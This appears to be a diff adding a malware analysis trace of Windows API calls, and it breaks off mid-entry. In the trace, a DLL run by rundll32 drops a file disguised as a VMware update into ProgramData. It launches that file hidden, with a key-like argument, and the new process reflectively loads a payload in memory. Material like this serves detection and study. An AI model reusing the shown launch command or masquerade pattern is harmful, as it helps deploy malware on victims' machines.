+[STR]         -> "C:\\ProgramData\\VMware\\vmnat-update.bin"
+[PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
+[PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
+[RET] 0x7ff9b1563912 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[EVT] [Kernel Monitoring]
+[MSG] [FILE_CREATED] [C:\ProgramData\VMware\vmnat-update.bin]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <WriteFile> in [KERNEL32.DLL] 
+[PAR] HANDLE       hFile                  : 0xa0
+[PAR] LPVOID       lpBuffer               : 0x0000003DFF357040
+[PAR] DWORD        nNumberOfBytesToWrite  : 0x80200
+[PAR] LPDWORD      lpNumberOfBytesWritten : 0x0000003DFD70CD08
+[PAR] LPOVERLAPPED lpOverlapped           : 0x0
+[RET] 0x7ff9b1563936 in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0xa0
+[RET] 0x7ff9b156393f in [cms_data_final.dll]
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <CreateProcessA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
+[PAR] LPCTSTR               lpCommandLine        : 0x0000003DFD70EEE0
+[STR]                       -> "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\VMware\\vmnat-update.bin,OCSP_resp_find lxUi5CZ0IV45j89Y 4901"
+[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
+[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
+[PAR] BOOL                  bInheritHandles      : 0x0
+[PAR] DWORD                 dwCreationFlags      : 0x8000000 (CREATE_NO_WINDOW)
+[PAR] LPVOID                lpEnvironment        : 0x0
+[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
+[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x0000003DFD70CD30
+[FLD]                       -> lpDesktop   = 0x0 (null)
+[FLD]                       -> lpTitle     = 0x0 (null)
+[FLD]                       -> dwFlags     = 0x0 
+[FLD]                       -> wShowWindow = 0x0
+[FLD]                       -> hStdInput   = 0x0
+[FLD]                       -> hStdOutput  = 0x0
+[FLD]                       -> hStdError   = 0x0
+[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x0000003DFD70CD10
+[RET] 0x7ff9b156397d in [cms_data_final.dll]
+
+Creation de Processus, pid [0xb68] (C:\Windows\System32\rundll32.exe)
+
+[ * ] [pid 0xaa0][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <FlsFree> in [KERNEL32.DLL] 
+[RET] 0x7ff9b1566890 in [cms_data_final.dll]
+
+Destruction de Processus, pid [0xaa0] (C:\Windows\System32\rundll32.exe)
+
+Thread created by monitored process : Now monitoring [pid 0xb68][tid 0xba4]
+
+********** Dumping PEB64 **********
+
+	Path : C:\Windows\System32\rundll32.exe
+	Base : 0x00007FF7574A0000
+	Size : 0x13000
+
+	Path : C:\Windows\SYSTEM32\ntdll.dll
+	Base : 0x00007FF9BDEC0000
+	Size : 0x1ac000
+
+	Path : C:\Windows\system32\KERNEL32.DLL
+	Base : 0x00007FF9BB760000
+	Size : 0x13e000
+
+	Path : C:\Windows\system32\KERNELBASE.dll
+	Base : 0x00007FF9BB0E0000
+	Size : 0x115000
+
+	Path : C:\Windows\system32\USER32.dll
+	Base : 0x00007FF9BCF60000
+	Size : 0x177000
+
+	Path : C:\Windows\system32\msvcrt.dll
+	Base : 0x00007FF9BDA60000
+	Size : 0xaa000
+
+	Path : C:\Windows\system32\imagehlp.dll
+	Base : 0x00007FF9BD0E0000
+	Size : 0x16000
+
+	Path : C:\Windows\system32\SHLWAPI.dll
+	Base : 0x00007FF9BDB10000
+	Size : 0x54000
+
+	Path : C:\Windows\SYSTEM32\combase.dll
+	Base : 0x00007FF9BD5A0000
+	Size : 0x211000
+
+	Path : C:\Windows\system32\GDI32.dll
+	Base : 0x00007FF9BDB70000
+	Size : 0x151000
+
+	Path : C:\Windows\system32\RPCRT4.dll
+	Base : 0x00007FF9BB600000
+	Size : 0x141000
+
+	Path : C:\Windows\system32\IMM32.DLL
+	Base : 0x00007FF9BDCD0000
+	Size : 0x36000
+
+	Path : C:\Windows\system32\MSCTF.dll
+	Base : 0x00007FF9BD310000
+	Size : 0x153000
+
+	Path : C:\ProgramData\VMware\vmnat-update.bin
+	Base : 0x00007FF9AA0D0000
+	Size : 0x86000
+
+	Path : C:\Windows\system32\SHELL32.dll
+	Base : 0x00007FF9BB8C0000
+	Size : 0x1519000
+
+	Path : C:\Windows\system32\ADVAPI32.dll
+	Base : 0x00007FF9BCDF0000
+	Size : 0xaa000
+
+	Path : C:\Windows\SYSTEM32\sechost.dll
+	Base : 0x00007FF9BCEA0000
+	Size : 0x59000
+
+********** End Dump PEB64 **********
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetSystemTimeAsFileTime> in [KERNEL32.DLL] 
+[PAR] LPFILETIME lpSystemTimeAsFileTime : 0x000000457D00F320
+[RET] 0x7ff9aa0edf81 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetCurrentProcessId> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0edf8c in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <QueryPerformanceCounter> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0edfb5 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <HeapCreate> in [KERNEL32.DLL] 
+[PAR] DWORD  flOptions     : 0x0 
+[PAR] SIZE_T dwInitialSize : 0x1000
+[PAR] SIZE_T dwMaximumSize : 0x0
+[RET] 0x7ff9aa0e9e10 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetVersion> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0e9e22 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetCommandLineA> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0e71ed in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetEnvironmentStringsW> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0edc1b in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D19DEE0
+[PAR] int     cchWideChar       : 0x4f5
+[PAR] LPSTR   lpMultiByteStr    : 0x0
+[PAR] int     cbMultiByte       : 0x0
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9aa0edc72 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D19DEE0
+[PAR] int     cchWideChar       : 0x4f5
+[PAR] LPSTR   lpMultiByteStr    : 0x000000457D4B0B00
+[PAR] int     cbMultiByte       : 0x4f5
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9aa0edcad in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <FreeEnvironmentStringsW> in [KERNEL32.DLL] 
+[PAR] LPWCH penv : 0x000000457D19DEE0
+[STR]       -> "=C:=C:\Users\user\Desktop\google"
+[RET] 0x7ff9aa0edcc5 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetStartupInfoW> in [KERNEL32.DLL] 
+[PAR] LPSTARTUPINFOW lpStartupInfo : 0x000000457D00F250
+[RET] 0x7ff9aa0eb783 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <SetHandleCount> in [KERNEL32.DLL] 
+[PAR] UINT count : 0x20 
+[RET] 0x7ff9aa0eba0e in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetACP> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f09ea in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <IsValidCodePage> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f0aa9 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f0abe in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f0724 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00ECA0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7ff9aa0f32d8 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00ECA0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D00E980
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7ff9aa0f3384 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetStringTypeW> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f339b in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00ECA0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7ff9aa0f24a8 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00ECA0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D00E970
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7ff9aa0f2545 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LCMapStringW> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f256c in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LCMapStringW> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f2646 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D00E760
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x000000457D00EDA0
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9aa0f2686 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00ECA0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7ff9aa0f24a8 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00ECA0
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D00E970
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7ff9aa0f2545 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LCMapStringW> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f256c in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LCMapStringW> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0f2646 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D00E760
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x000000457D00EEA0
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9aa0f2686 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetModuleFileNameA> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : NULL. (Try to get current .exe's path)
+[PAR] LPSTR   lpFilename : 0x00007FF9AA14E8E0
+[PAR] DWORD   nSize      : 0x104
+[RET] 0x7ff9aa0edb40 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LocalAlloc> in [KERNEL32.DLL] 
+[PAR] UINT   uFlags : 0x40
+[PAR] SIZE_T uBytes : 0x104
+[RET] 0x7ff9aa0d3a45 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <CommandLineToArgvW> in [SHELL32.dll] 
+[PAR] LPCWSTR lpCmdLine : 0x000000457D196022
+[STR]         -> "lxUi5CZ0IV45j89Y 4901"
+[PAR] int     *pNumArgs : 0x000000457D00D7A0
+[RET] 0x7ff9aa0d3a75 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LocalFree> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0d3afd in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x200 (WC_COMPOSITECHECK)
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D00F910
+[PAR] int     cchWideChar       : 0xffffffff
+[PAR] LPSTR   lpMultiByteStr    : 0x000000457D00F800
+[PAR] int     cbMultiByte       : 0x10
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7ff9aa0d3b45 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <CreateMutexA> in [KERNEL32.DLL] 
+[PAR] LPSECURITY_ATTRIBUTES lpMutexAttributes : 0x0
+[PAR] BOOL                  bInitialOwner     : 0x0
+[PAR] LPCTSTR               lpName            : 0x000000457D00F7C0
+[STR]                       -> "lxUi5CZ0IV45j89Y"
+[RET] 0x7ff9aa0d3b83 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LocalAlloc> in [KERNEL32.DLL] 
+[PAR] UINT   uFlags : 0x40
+[PAR] SIZE_T uBytes : 0x2182f2
+[RET] 0x7ff9aa0d3c2c in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0000000180000000
+[PAR] SIZE_T dwSize       : 0xaf000
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d1a95 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0000000180000000
+[PAR] SIZE_T dwSize       : 0xaf000
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d1b13 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0000000180000000
+[PAR] SIZE_T dwSize       : 0x400
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d1b2b in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0000000180001000
+[PAR] SIZE_T dwSize       : 0x42a00
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d169d in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0000000180044000
+[PAR] SIZE_T dwSize       : 0x19a00
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d169d in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x000000018005E000
+[PAR] SIZE_T dwSize       : 0x10800
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d169d in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000001800A6000
+[PAR] SIZE_T dwSize       : 0x3c00
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d169d in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000001800AA000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d169d in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000001800AB000
+[PAR] SIZE_T dwSize       : 0x3800
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d169d in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x000000018005CB88
+[PAR] UINT_PTR    ucb : 0x14
+[RET] 0x7ff9aa0d18eb in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LoadLibraryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000018005D10E ("KERNEL32.dll")
+[RET] 0x7ff9aa0d1926
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D098 ("CloseHandle")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D0A6 ("GetTickCount")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D0B6 ("InitializeCriticalSectionAndSpinCount")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D080 ("EnterCriticalSection")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D0E6 ("LocalAlloc")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D0F4 ("LocalFree")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D100 ("CreateThread")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D070 ("GetLastError")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D05A ("MultiByteToWideChar")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D042 ("LeaveCriticalSection")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D02C ("WideCharToMultiByte")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D01A ("VirtualProtect")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D00A ("LoadLibraryA")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005CFFA ("VirtualAlloc")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005CFE8 ("GetProcAddress")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005CFD8 ("IsBadReadPtr")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005CFC6 ("GetProcessHeap")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005CFB8 ("VirtualFree")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005CFAC ("HeapFree")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005CFA0 ("HeapAlloc")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
